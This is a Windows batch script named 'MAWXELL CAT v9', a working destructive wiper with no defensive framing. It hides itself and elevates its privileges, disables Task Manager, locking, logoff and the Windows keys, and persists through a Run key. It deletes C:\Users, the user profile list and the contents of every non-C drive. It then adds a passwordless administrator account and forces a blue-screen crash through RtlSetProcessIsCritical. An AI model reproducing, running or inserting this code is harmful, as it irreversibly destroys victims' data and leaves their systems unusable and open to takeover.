@echo off
title mawxell cat
color 0C
setlocal

rem ============================================================
rem  MAWXELL CAT v9 - hidden window | 60s wait | forced reboot
rem  Win10/11 ONLY | BSOD :) | lock: more more more user, NO pass
rem  CAD screen: Lock + Switch user + Sign out + TaskMgr = GONE
rem ============================================================

if exist "%SystemRoot%\Temp\mc_hidden.flag" goto :payload

rem ---------- OS GATE ----------
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName 2>nul | findstr /i /c:"Windows 10" /c:"Windows 11" >nul
if errorlevel 1 goto :notok

rem ---------- ELEVATE ----------
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoP -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

rem ---------- COPY TO TEMP ----------
copy /y "%~f0" "%SystemRoot%\Temp\mawxell_cat.bat" >nul 2>&1
> "%SystemRoot%\Temp\mc_hidden.flag" echo 1

rem ---------- HIDE + RELAUNCH ----------
> "%SystemRoot%\Temp\mchide.vbs" echo Set o = CreateObject("WScript.Shell")
>> "%SystemRoot%\Temp\mchide.vbs" echo o.Run "%SystemRoot%\Temp\mawxell_cat.bat", 0, False
wscript //nologo "%SystemRoot%\Temp\mchide.vbs"
exit /b

:payload
cd /d "%SystemRoot%\Temp"
attrib +h "%SystemRoot%\Temp\mawxell_cat.bat" "%SystemRoot%\Temp\mchide.vbs" "%SystemRoot%\Temp\mc_hidden.flag" >nul 2>&1

rem ---------- WAIT 60s silent ----------
set WAIT=60
timeout /t %WAIT% /nobreak >nul

rem ---------- 1) WIN+R ----------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1

rem ---------- 2) CTRL+ALT+DEL SCREEN NUKED ----------
rem     Lock gone, Switch user gone, Sign out gone, TaskMgr gone
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v HideFastUserSwitching /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoLogoff /t REG_DWORD /d 1 /f >nul 2>&1
taskkill /f /im taskmgr.exe >nul 2>&1
takeown /f "%SystemRoot%\System32\taskmgr.exe" >nul 2>&1
icacls "%SystemRoot%\System32\taskmgr.exe" /grant *S-1-5-32-544:F >nul 2>&1
del /f /q "%SystemRoot%\System32\taskmgr.exe" >nul 2>&1
takeown /f "%SystemRoot%\SysWOW64\taskmgr.exe" >nul 2>&1
icacls "%SystemRoot%\SysWOW64\taskmgr.exe" /grant *S-1-5-32-544:F >nul 2>&1
del /f /q "%SystemRoot%\SysWOW64\taskmgr.exe" >nul 2>&1
gpupdate /force >nul 2>&1

rem ---------- 3) WIN KEY ----------
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f >nul 2>&1

rem ---------- 4) TASKBAR HIDE (no auto-logout) ----------
powershell -NoP -Command "$k=(Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3' -EA SilentlyContinue).Settings; if($k){$k[8]=3; Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3' Settings $k}; Stop-Process -Name explorer -Force -EA SilentlyContinue" >nul 2>&1

rem ---------- 5) PERSISTENCE + BSOD :) + AUTO-REBOOT ----------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v mawxell_cat /t REG_SZ /d "wscript.exe %SystemRoot%\Temp\mchide.vbs" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayMessage /t REG_SZ /d ":)" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayParameters /t REG_SZ /d "mawxell cat" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v AutoReboot /t REG_DWORD /d 1 /f >nul 2>&1

rem ---------- 6) GUARANTEED REBOOT TASK ----------
schtasks /create /tn MCBoot /tr "shutdown.exe /r /t 0 /f" /sc once /st 00:00 /ru SYSTEM /f >nul 2>&1
schtasks /run /tn MCBoot >nul 2>&1

rem ---------- 7) WIPE (no Access Denied) ----------
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im SearchHost.exe >nul 2>&1
taskkill /f /im SearchApp.exe >nul 2>&1
taskkill /f /im OneDrive.exe >nul 2>&1
taskkill /f /im Teams.exe >nul 2>&1

takeown /f "C:\Users" /r /d y >nul 2>&1
icacls "C:\Users" /grant *S-1-5-32-544:F /t /c /q >nul 2>&1
rd /s /q "C:\Users" >nul 2>&1

reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" /f >nul 2>&1

powershell -NoP -Command "Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Name -ne 'C'} | ForEach-Object { Remove-Item ($_.Root + '*') -Recurse -Force -ErrorAction SilentlyContinue }" >nul 2>&1

rem ---------- 8) LOCK USER: more more more user / NO password ----------
powershell -NoP -Command "New-LocalUser -Name 'more more more user' -NoPassword -ErrorAction SilentlyContinue"
net user "more more more user" "" >nul 2>&1
net localgroup Administrators "more more more user" /add >nul 2>&1
net user "more more more user" /active:yes /expires:never >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "more more more user" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d "0" /f >nul 2>&1

rem ---------- 9) REAL BSOD :) ----------
> "%SystemRoot%\Temp\mcs.ps1" echo $sig = 'using System;using System.Runtime.InteropServices;public struct TP{public int Count;public long Luid;public int Attr;}public class K{[DllImport("advapi32.dll")]public static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);[DllImport("advapi32.dll")]public static extern bool LookupPrivilegeValue(string s,string n,out long l);[DllImport("advapi32.dll")]public static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TP p,int b,IntPtr z,IntPtr y);[DllImport("ntdll.dll")]public static extern int RtlSetProcessIsCritical(int b,ref int o,int s);[DllImport("kernel32.dll")]public static extern IntPtr GetCurrentProcess();[DllImport("kernel32.dll")]public static extern bool TerminateProcess(IntPtr h,uint e);public static void Go(){IntPtr h=GetCurrentProcess();IntPtr t;OpenProcessToken(h,40,out t);long l;LookupPrivilegeValue(null,"SeDebugPrivilege",out l);TP p=new TP();p.Count=1;p.Luid=l;p.Attr=2;AdjustTokenPrivileges(t,false,ref p,0,IntPtr.Zero,IntPtr.Zero);int o=0;RtlSetProcessIsCritical(1,ref o,0);TerminateProcess(h,0);}}'
>> "%SystemRoot%\Temp\mcs.ps1" echo Add-Type -TypeDefinition $sig
>> "%SystemRoot%\Temp\mcs.ps1" echo [K]::Go()
powershell -NoP -EP Bypass -File "%SystemRoot%\Temp\mcs.ps1" >nul 2>&1

rem ---------- 10) FALLBACK REBOOT ----------
shutdown /r /t 0 /f
exit /b

:notok
echo  [X] Windows 10 / 11 only.
pause
exit /b
